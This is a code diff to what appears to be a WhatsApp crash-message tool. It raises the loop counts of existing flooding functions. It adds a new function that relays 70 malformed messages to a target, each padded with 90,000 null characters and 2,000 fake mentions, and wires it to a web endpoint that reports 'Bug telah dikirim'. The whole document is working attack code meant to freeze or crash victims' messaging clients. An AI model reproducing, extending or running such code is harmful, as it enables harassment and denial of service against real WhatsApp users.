@@ -325,7 +325,7 @@ function pseudoRandomBytes(length) {
 // ################## //
 // === FUNCTION BUG === //
 async function OfferMpM(target) {
-for (let iter = 1; iter <= 100; iter++) {
+for (let iter = 1; iter <= 200; iter++) {
   const msg = await generateWAMessageFromContent(
     target,
       {
@@ -390,7 +390,7 @@ for (let iter = 1; iter <= 100; iter++) {
 }
 
 async function NativeSql3(target) {
-for (let iter = 1; iter <= 200; iter++) {
+for (let iter = 1; iter <= 900; iter++) {
   let msg = {
     interactiveMessage: {
       body: {
@@ -449,7 +449,52 @@ async function FreezeFileInvis(target, Ptcp = true) {
             }
           }
         }
-    }, { participant: { jid: mentionedJid, target } }, { messageId: null });
+    }, { participant: { jid: target } }, { messageId: null });
+}
+
+async function InvisDelayPriv(target, jiAiDi) {
+for(let I = 0; I < 70; I++) {
+  await sock.relayMessage("status@broadcast", {
+      ephemeralMessage: {
+        message: {
+          interactiveResponseMessage: {
+            body: {
+              text: "P3d0 - Ex3cutor",
+              format: "EXTENSION_1"
+            },
+            nativeFlowResponseMessage: {
+              name: "call_permission_request",
+              paramsJson: "\u0000".repeat(90000),
+              version: 3
+            },
+            contextInfo: {
+              mentionedJid: Array.from({ length:2000 }, (_, z) => `1313555000${z + 1}@s.whatsapp.net`),
+              externalAdReply: {
+                body: "☠️",
+                mediaType: 1,
+                thumbnailUrl: "https://files.catbox.moe/aauj7v.webp",
+                sourceUrl: "https://t.me/whyuxD",
+                sourceType: "whatsapp",
+                cdogio: 'cdogio' + Math.floor(Math.random() * 1000000),
+                sourceId: String(Math.floor(Math.random() * 900000000) + 100000),
+                ctwaClid: 'clid' + Math.floor(Math.random() * 1000000),
+                ctaPayload: 'payload' + Math.random().toString(36).substring(2, 10),
+                ref: "referencia",
+                mediaType: 1,
+                clickToWhatsappCall: true,
+                adContextPreviewDismissed: false,
+                sourceApp: "com.whatsapp",
+                automatedGreetingMessageShown: false,
+                greetingMessageBody: "x",
+                disableNudge: true,
+                originalImageUrl: "https://t.me/whyuxD"
+              }
+            },
+          }
+        }
+      }
+    }, jiAiDi ? { statusJidList:[target] } : {});
+  }
 }
 
 // ###################### //
@@ -466,7 +511,7 @@ async function FreezeFileInvis(target, Ptcp = true) {
       await FreezeFileInvis(jid)
       return res.json({ success: true, message: "Bug telah dikirim" });
     } else if (type === "bug_d") {
-      
+      await InvisDelayPriv(jid, true)
       return res.json({ success: true, message: "Bug telah dikirim" });
     } else if (type === "bug_e") {
 
